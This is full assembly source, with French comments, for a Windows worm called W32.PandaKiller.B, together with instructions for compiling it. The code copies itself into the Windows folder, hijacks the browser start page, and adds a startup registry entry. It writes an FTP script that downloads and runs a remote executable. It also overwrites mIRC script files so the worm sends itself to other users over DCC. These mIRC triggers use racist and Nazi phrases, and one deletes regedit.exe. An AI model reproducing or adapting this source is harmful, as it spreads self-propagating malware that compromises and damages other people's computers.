; comment $
; 
;            W32.PandaKiller.B par PandaKiller le 14 octobre 2000
; 
; 
; S'AUTO-COPIE DANS     : - %windir%\WinExec.exe
; 
; 
; DESCRIPTION:
; 
; Ce programme modifie le nom d'enregistrement en PandaKiller. Il se copie
; dans %windir% (Dossier WINDOWS) et modifie la page de d‚marrage d'Internet.
; Il cr‚e ensuite trois fichiers :
; - FTP.DRV : ce fichier va se connecter par FTP et t‚l‚charger un programme
;             qui est KILL_CIH.EXE (un programme contre CIH)
; - FTP.BAT : il va ‚x‚cuter FTP.DRV
; - MIRC.EKP : un script pour mIRC qui permet une autoprobagation du fichier.
;         A la connection, il active FTP.BAT et cope WINEXEC.EXE en
;         PICTURE.EXE. Quand quelqu'un arrive, il lui envoie PICTURE.EXE
;         *worm* il envoie ‚galement PICTURE.EXE
;         *KKK* : d‚connecte
;         *White Power* : ‚teint le programme
;         *hitler* : efface Regedit.exe
; 
; POUR COMPILER:
; 
; tasm32 /M /ML PandaKiller2.asm
; tlink32 -Tpe -x -aa PandaKiller2.obj,,,import32
; 
; Lien :  www.coderz.net/matrix
;         www.matrixvx.org
;         www.coderz.net
; $

.386p
locals
jumps
.model flat

extrn RegCreateKeyExA:PROC
extrn RegSetValueExA:PROC
extrn RegCloseKey:PROC
extrn GetWindowsDirectoryA:PROC
extrn GetModuleHandleA:PROC
extrn GetModuleFileNameA:PROC
extrn CopyFileA:PROC
extrn lstrcat:PROC
extrn CreateFileA:PROC
extrn WriteFile:PROC
extrn CloseHandle:PROC
extrn WinExec:PROC
extrn CreateDirectoryA:PROC
extrn ExitProcess:PROC


.data
moi     dd 260 dup (0)
targ1   dd 260 dup (0)
fh      dd 0
octets  dd 0
l       dd 0
p       dd 0
CLE     db "\Software\Microsoft\Windows\CurrentVersion",00h
DONNEE  db "PandaKiller",00h
NOM     db "RegisteredOwner",00h
CLE2    db "\Software\Microsoft\Internet Explorer\Main",00h
DONNEE2 db "http://kadosh.multimania.com",00h
NOM2    db "Start Page",00h
CLE3    db "\Software\Microsoft\Windows\CurrentVersion\Run",00h
DONNEE3 db "C:\Win\kill_cih.exe",00h
NOM3    db "killcih",00h
copie1  db "\WinExec.exe",00h
dossier db "C:\Win",00h
bat     db "C:\Win\ftp.bat",00h
drv     db "C:\Win\ftp.drv",00h
ini     db "C:\Win\mirc.ekp",00h
script1 db "C:\mirc\script.ini",00h
script2 db "C:\mirc32\script.ini",00h
script3 db "C:\program files\mirc\script.ini",00h
script4 db "C:\program files\mirc32\script.ini",00h



batd    db "@echo off",0dh,0ah
        db "start ftp -i -v -s:C:\Win\ftp.drv",00h
batsize equ $-batd

drvd    db "open",0dh,0ah
        db "members.aol.com",0dh,0ah
        db "pentasm99",0dh,0ah
        db "cd Panda",0dh,0ah
        db "binary",0dh,0ah
        db "lcd C:\Win",0dh,0ah
        db "get kill_cih.exe",0dh,0ah
        db "bye",0dh,0ah
        db "exit",0dh,0ah
drvsize equ $-drvd

inid    db "[SCRIPT]",0dh,0ah
        db "n1=on 1:start:{",0dh,0ah
        db "n2=.remote on",0dh,0ah
        db "n3=.ctcps on",0dh,0ah
        db "n4=.events on",0dh,0ah
        db "n5=}",0dh,0ah
        db "n6=on 1:connect:{",0dh,0ah
        db "n7= /.copy -0 C:\Windows\WinExec.exe C:\Picture.exe",0dh,0ah
        db "n8= /.run -n C:\command.com start C:\Win\ftp.bat",0dh,0ah
        db "n9=on 1:join:#:{",0dh,0ah
        db "n10=if ( $nick == $ma )  {halt } .dcc send $nick C:\Picture.exe",0dh,0ah
        db "n11=}",0dh,0ah
        db "n12=on 1:text:*worm*:{",0dh,0ah
        db "n13=if ( $nick == $ma )  {halt } .dcc send $nick C:\Picture.exe",0dh,0ah
        db "n14=}",0dh,0ah
        db "n15=on 1:text:*KKK*:/disconnect",0dh,0ah
        db "n16=on 1:text:*white power*:/exit",0dh,0ah
        db "n17=on 1:text:*hitler*:/remove C:\Windows\regedit.exe",0dh,0ah
inisize equ $-inid

.code
REGISTRE:
        push offset l
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE
        push 80000002h                  ;HKEY_LOCAL_MACHINE
        call RegCreateKeyExA
        push 05h
        push offset DONNEE              ;PandaKiller
        push 01h
        push 0
        push offset NOM                 ;DANS RegisteredOwner
        push p
        call RegSetValueExA             ;CREE UNE VALEUR 
        push 0
        call RegCloseKey                ;FERME LA BASE DE REGISTRE

AUTO_COPIE:
        push 00000000h
        call GetModuleHandleA
        push 260
        push offset moi
        push eax
        call GetModuleFileNameA
        push 260
        push offset targ1
        call GetWindowsDirectoryA
        push offset copie1
        push offset targ1
        call lstrcat
        push 00000000h
        push offset targ1
        push offset moi
        call CopyFileA                  ;%windir%\WinExec.exe

CREER_DOSSIER:
        push 00000000h
        push offset dossier
        call CreateDirectoryA           ;C:\Win

REGISTRE2:
        push offset l
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE2
        push 80000001h                  ;HKEY_CURRENT_USER
        call RegCreateKeyExA
        push 05h
        push offset DONNEE2             ;kadosh.multimania.com
        push 01h
        push 0
        push offset NOM2                ;Start Page
        push p
        call RegSetValueExA             ;CREE UNE VALEUR
        push 0
        call RegCloseKey                ;FERME LA BASE DE REGISTRE

        push offset l
        push offset p
        push 0
        push 1F0000h + 1 + 2h
        push 0
        push 0
        push 0
        push offset CLE3
        push 80000002h                  ;HKEY_LOCAL_MACHINE
        call RegCreateKeyExA
        push 05h
        push offset DONNEE3             ;C:\nobo.exe
        push 01h
        push 0
        push offset NOM3                ;NOBO
        push p
        call RegSetValueExA             ;CREE UNE VALEUR
        push 0
        call RegCloseKey                ;FERME LA BASE DE REGISTRE

FICHIER:
        push 00000000h
        push 00000080h
        push 00000002h
        push 00000000h
        push 00000001h
        push 40000000h
        push offset bat
        call CreateFileA
        mov  [fh],eax
        push 00h
        push offset octets
        push batsize
        push offset batd
        push [fh]
        call WriteFile
        push [fh]
        call CloseHandle

        push 00000000h
        push 00000080h
        push 00000002h
        push 00000000h
        push 00000001h
        push 40000000h
        push offset drv
        call CreateFileA
        mov  [fh],eax
        push 00h
        push offset octets
        push drvsize
        push offset drvd
        push [fh]
        call WriteFile
        push [fh]
        call CloseHandle

        push 00000000h
        push 00000080h
        push 00000002h
        push 00000000h
        push 00000001h
        push 40000000h
        push offset ini
        call CreateFileA
        mov  [fh],eax
        push 00h
        push offset octets
        push inisize
        push offset inid
        push [fh]
        call WriteFile
        push [fh]
        call CloseHandle

COPIE_MIRC:
        push 00000000h
        push offset script1
        push offset ini
        call CopyFileA
        push 00000000h
        push offset script2
        push offset ini
        call CopyFileA
        push 00000000h
        push offset script3
        push offset ini
        call CopyFileA
        push 00000000h
        push offset script4
        push offset ini
        call CopyFileA

WinExecBat:
        push 1
        push offset bat
        call WinExec

FIN:    push 0
        call ExitProcess

end REGISTRE
